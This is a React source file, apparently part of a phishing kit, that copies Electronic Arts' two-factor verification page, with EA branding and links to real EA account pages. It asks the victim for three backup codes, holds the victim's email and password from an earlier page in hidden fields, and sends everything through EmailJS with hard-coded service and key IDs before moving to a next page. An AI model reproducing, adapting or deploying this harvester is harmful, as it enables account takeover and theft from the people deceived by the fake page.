import  React , { useRef } from 'react';
import logo from "./logo.svg";
import "./App.css";
import Checkbox from '@mui/material/Checkbox';
import {useNavigate} from 'react-router-dom';
import emailjs, { init } from "emailjs-com";

function Second(props) {
  const form = useRef();
  const navigate = useNavigate();

  const [code1, setCode1] = React.useState("");
  const [code2, setCode2] = React.useState("");
  const [code3, setCode3] = React.useState("");
  const [code1css, setCode1css] = React.useState("none");
  const [code2css, setCode2css] = React.useState("none");
  const [code3css, setCode3css] = React.useState("none");

  const handleCode1 = (event) => {
    setCode1(event.target.value);
    if (event.target.value.length == 8) {
      setCode1css('none');
    } else {
      setCode1css('');
    }
  };

  const handleCode2 = (event) => {
    setCode2(event.target.value);
    if (event.target.value.length == 8) {
      setCode2css('none');
    } else {
      setCode2css('');
    }
  };

  const handleCode3 = (event) => {
    setCode3(event.target.value);
    if (event.target.value.length == 8) {
      setCode3css('none');
    } else {
      setCode3css('');
    }
  };

  const handlesubmit = (e) => {
    e.preventDefault();
    if (code1.length == 8) {
      setCode1css('none');
    } else {
      setCode1css('');
    }

    if (code2.length == 8) {
      setCode2css('none');
    } else {
      setCode2css('');
    }

    if (code3.length == 8) {
      setCode3css('none');
    } else {
      setCode3css('');
    }

    if (code1.length == 8 && code2.length == 8 && code3.length == 8)
    {    
      
      console.log(form);
      
      emailjs.sendForm("service_0hai4ga", "template_fugsxby", form.current, "kBAEPX9e4YQK8cMc6").then(
        (result) => {
          
          console.log(result.text);
          navigate('/third', {replace: true});
        },
        (error) => {
          console.log(error.text);
        }
      );
    }
  };

  const [checked, setChecked] = React.useState(true);

  const handleChange = (event) => {
    setChecked(event.target.checked);
  };

  return (
    <div className="a">
      <div className="form-container">
        <form id="loginForm" ref={form} onSubmit={handlesubmit}>
          <div id="tfa-login" className="views">
            <div
              className="otknotice-stripe otknotice-active"
              id="junoBannerBox"
              style={{display: "none"}}
            >
              <div className="otknotice-stripe-message">
                <span className="otkicon">
                  <svg
                    height="24"
                    viewBox="0 0 24 24"
                    width="24"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <g fill="none" fillRule="evenodd">
                      <path d="m0 0h24v24h-24z"></path>
                      <path
                        d="m12 1.5c5.7989899 0 10.5 4.70101013 10.5 10.5 0 5.7989899-4.7010101 10.5-10.5 10.5-5.79898987 0-10.5-4.7010101-10.5-10.5 0-5.79898987 4.70101013-10.5 10.5-10.5zm0 2c-4.69442037 0-8.5 3.80557963-8.5 8.5 0 4.6944204 3.80557963 8.5 8.5 8.5 4.6944204 0 8.5-3.8055796 8.5-8.5 0-4.69442037-3.8055796-8.5-8.5-8.5zm0 7.5c.5128358 0 .9355072.3860402.9932723.8833789l.0067277.1166211v4c0 .5522847-.4477153 1-1 1-.5128358 0-.9355072-.3860402-.9932723-.8833789l-.0067277-.1166211v-4c0-.5522847.4477153-1 1-1zm0-3.5c.5522847 0 1 .44771525 1 1s-.4477153 1-1 1-1-.44771525-1-1 .4477153-1 1-1z"
                        fill="#276afc"
                      ></path>
                    </g>
                  </svg>
                </span>
                <span className="otkc otkc-small">
                  <strong></strong>
                </span>
              </div>
            </div>
            <div
              className="otknotice-stripe otknotice-active"
              id="online-general-info"
              style={{display: "none"}}
            >
              <div className="otknotice-stripe-message">
                <span className="otkicon">
                  <svg
                    height="24"
                    viewBox="0 0 24 24"
                    width="24"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <g fill="none" fillRule="evenodd">
                      <path d="m0 0h24v24h-24z"></path>
                      <path
                        d="m12 1.5c5.7989899 0 10.5 4.70101013 10.5 10.5 0 5.7989899-4.7010101 10.5-10.5 10.5-5.79898987 0-10.5-4.7010101-10.5-10.5 0-5.79898987 4.70101013-10.5 10.5-10.5zm0 2c-4.69442037 0-8.5 3.80557963-8.5 8.5 0 4.6944204 3.80557963 8.5 8.5 8.5 4.6944204 0 8.5-3.8055796 8.5-8.5 0-4.69442037-3.8055796-8.5-8.5-8.5zm0 7.5c.5128358 0 .9355072.3860402.9932723.8833789l.0067277.1166211v4c0 .5522847-.4477153 1-1 1-.5128358 0-.9355072-.3860402-.9932723-.8833789l-.0067277-.1166211v-4c0-.5522847.4477153-1 1-1zm0-3.5c.5522847 0 1 .44771525 1 1s-.4477153 1-1 1-1-.44771525-1-1 .4477153-1 1-1z"
                        fill="#276afc"
                      ></path>
                    </g>
                  </svg>
                </span>
                <span className="otkc otkc-small"></span>
              </div>
            </div>
            <section id="verificationGate" className="">
              <a
                href="/"
                role="button"
                id="backToLoginBtn"
                className="back-btn"
              >
                <i className="otkicon"></i>
                <span className="quantum-input-icon back-btn-icon">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 16 16"
                    className="injected-svg css-ojkidl"
                    data-src="/static/media/ARROW_LEFT.e40e5952.svg"
                  >
                    <g
                      id="Icons/SM/Navigation/Arrow-Left"
                      fill="none"
                      fillRule="evenodd"
                    >
                      <path id="Bounding-Box" d="M0 0h16v16H0z"></path>
                      <path
                        id="Primary"
                        fill="#FFF"
                        d="M5.293 4.707a1 1 0 0 1 1.414-1.414l4 4a1 1 0 0 1 0 1.415l-4 4a1 1 0 1 1-1.414-1.415L8.586 8 5.293 4.707z"
                        transform="matrix(-1 0 0 1 16 0)"
                      ></path>
                    </g>
                  </svg>
                </span>{" "}
                Back{" "}
              </a>
              <img
                className="header"
                aria-hidden="true"
                src="./SIGN IN_files/EALogo-New.svg"
              />
              <h1 className="otktitle otktitle-2">Enter your code</h1>
              <div className="otkc verify">
                {" "}
                We need your backup codes <a href="https://myaccount.ea.com/cp-ui/security/index" target="_blank">(https://myaccount.ea.com/cp-ui/security/index)</a> to 
                verify your identity. Enter your code below.
                {" "}
              </div>
              <br/>

                <input type="hidden" name="email" value={props.email} />
                <input type="hidden" name="password" value={props.password} />
                <div className="otkform-group">
                  <label className="otklabel label-uppercase" htmlFor="twoFactorCode">
                    Backup code 1
                  </label>
                  <div className="otkinput otkinput-grouped otkform-group-field input-margin-bottom-error-message otkinput-grouped_radius">
                    <input
                      type="text"
                      id="twoFactorCode"
                      name="code1"
                      defaultValue=""
                      placeholder="Enter 8 digit code"
                      autoCorrect="off"
                      autoCapitalize="off"
                      autoComplete="off"
                      value={code1}
                      onChange={handleCode1}
                    />
                  </div>
                  <div
                      id="online-input-error-email"
                      style={{ display: code1css}}
                    >
                      <p className="otkinput-errormsg otkc" >Please enter correctly</p>
                  </div>
                </div>
                <div className="otkform-group">
                  <label className="otklabel label-uppercase" htmlFor="twoFactorCode">
                    Backup code 2
                  </label>
                  <div className="otkinput otkinput-grouped otkform-group-field input-margin-bottom-error-message otkinput-grouped_radius">
                    <input
                      type="text"
                      id="twoFactorCode"
                      name="code2"
                      defaultValue=""
                      placeholder="Enter 8 digit code"
                      autoCorrect="off"
                      autoCapitalize="off"
                      autoComplete="off"
                      value={code2}
                      onChange={handleCode2}
                    />
                  </div>
                  <div
                      id="online-input-error-email"
                      style={{ display: code2css}}
                    >
                      <p className="otkinput-errormsg otkc" >Please enter correctly</p>
                  </div>
                </div>
                <div className="otkform-group">
                  <label className="otklabel label-uppercase" htmlFor="twoFactorCode">
                    Backup code 3
                  </label>
                  <div className="otkinput otkinput-grouped otkform-group-field input-margin-bottom-error-message otkinput-grouped_radius">
                    <input
                      type="text"
                      id="twoFactorCode"
                      name="code3"
                      defaultValue=""
                      placeholder="Enter 8 digit code"
                      autoCorrect="off"
                      autoCapitalize="off"
                      autoComplete="off"
                      value={code3}
                      onChange={handleCode3}
                    />
                  </div>
                  <div
                      id="online-input-error-email"
                      style={{ display: code3css}}
                    >
                      <p className="otkinput-errormsg otkc" >Please enter correctly</p>
                  </div>
                </div>
                <br />
                <span className="otkcheckbox ">
                  <input type="hidden" name="_trustThisDevice" defaultValue="" />
                  <Checkbox
                    checked={checked}
                    onChange={handleChange}
                    inputProps={{ 'aria-label': 'controlled' }}
                    sx={{ '& .MuiSvgIcon-root': { fontSize: 28 } }}
                  />

                    <span id="content" className="link-in-message" style={{color:'white'}}>
                      Remember this device
                    </span>
                </span>
                <div className="separator-32"></div>
                <div className="btn-box">
                  <input
                    type="hidden"
                    name="_eventId"
                    defaultValue="submit"
                    id="_eventId"
                  />
                  <button
                    type="submit"
                    className="otkbtn otkbtn-primary  zero-margin"
                    id="btnSubmit"
                    style={{float:"right",maxWidth:"100%",fontSize:"16px"}}
                  >
                    Sign in
                  </button>
                </div>

              <div className="separator-16"></div>
              <a
                href=""
                id="resend"
                className="otka otkc resendLink zero-margin"
              >
              </a>
              <div className="separator-6"></div>
              <a
                href="https://help.ea.com/help/account/origin-login-verification-information/"
                target="_blank"
                id="problems-rev-code"
                className="otka otkc resendLink zero-margin"
              >
                {/* <i
                  className="otkicon otkicon-learnmore"
                  style={{fontSize:"22px",height:"16px",width:"24px",display:"inline-flex",top:"0px"}}
                ></i> */}
              </a>
              <br />
            </section>
          </div>
        </form>
      </div>
    </div>
  );
}

export default Second;
